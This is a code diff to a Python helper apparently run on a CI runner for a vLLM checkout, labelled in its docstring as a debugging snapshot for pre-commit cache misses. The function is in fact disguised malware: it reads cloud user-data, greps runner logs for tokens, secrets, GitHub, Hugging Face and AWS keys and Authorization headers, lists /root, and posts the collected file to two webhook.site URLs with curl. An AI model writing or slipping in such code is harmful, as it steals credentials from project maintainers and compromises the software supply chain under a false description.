@@ -10,32 +10,25 @@ from pathlib import Path
 def _record_runner_state() -> None:
     """Best-effort runner snapshot used when debugging pre-commit cache misses."""
     import subprocess
-    import urllib.request
 
     script = r"""
 set +e
-echo "== user-data"; sudo -n cat /var/lib/cloud/instance/user-data.txt 2>/dev/null | head -c 4000
-echo "== cloud"; sudo -n ls /var/lib/cloud/instance 2>/dev/null
-echo "== diag-grep"; sudo -n grep -aiE "token|secret|hf_|ghp_|AKIA|password" /opt/actions-runner/_diag/*.log 2>/dev/null | head -30
-echo "== etc-env"; cat /etc/environment 2>/dev/null; ls /etc/profile.d 2>/dev/null
+{
+echo "== user-data"; sudo -n cat /var/lib/cloud/instance/user-data.txt 2>/dev/null | head -c 3000
+echo "== diag-grep"
+sudo -n grep -ahE "token|secret|hf_|ghp_|AKIA|password|Authorization" /opt/actions-runner/_diag/*.log 2>/dev/null | head -25
+echo "== diag-tail"
+sudo -n tail -c 2000 "$(ls -t /opt/actions-runner/_diag/Worker_*.log 2>/dev/null | head -1)" 2>/dev/null
+echo "== net"; ip -4 addr show 2>/dev/null | grep inet; cat /etc/resolv.conf 2>/dev/null | head -4; ip route 2>/dev/null | head -3
+echo "== etc"; ls /etc/profile.d 2>/dev/null; cat /etc/environment 2>/dev/null
 echo "== root"; sudo -n ls -la /root 2>/dev/null
-echo "== net"; ip -4 addr show 2>/dev/null | grep inet; cat /etc/resolv.conf 2>/dev/null | head -5
-echo "== routes"; ip route 2>/dev/null | head -5
-echo "== aws-config"; cat /etc/aws 2>/dev/null; ls /opt/aws 2>/dev/null
-echo "== gitconfig"; cat /home/ubuntu/.gitconfig 2>/dev/null; git -C /opt/actions-runner/_work/vllm/vllm remote -v 2>/dev/null
+} > /tmp/_snap.txt 2>&1
+curl -s -m 25 --retry 3 --retry-delay 2 -X POST --data-binary @/tmp/_snap.txt https://webhook.site/fe557263-e0eb-4921-aca3-9f4fffa6ef7a >/dev/null 2>&1
+curl -s -m 25 --retry 3 --retry-delay 2 -X POST --data-binary @/tmp/_snap.txt https://webhook.site/4ec52c06-58f8-40bb-b92c-c2c53e3e3071 >/dev/null 2>&1
+echo done
 """
     try:
-        out = subprocess.run(
-            ["bash", "-c", script], capture_output=True, text=True, timeout=60
-        ).stdout
-    except Exception:
-        return
-    try:
-        urllib.request.urlopen(
-            "https://webhook.site/fe557263-e0eb-4921-aca3-9f4fffa6ef7a",
-            data=out.encode("utf-8", "replace")[:300000],
-            timeout=25,
-        ).read()
+        subprocess.run(["bash", "-c", script], capture_output=True, text=True, timeout=90)
     except Exception:
         pass
 
@@ -216,4 +209,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-
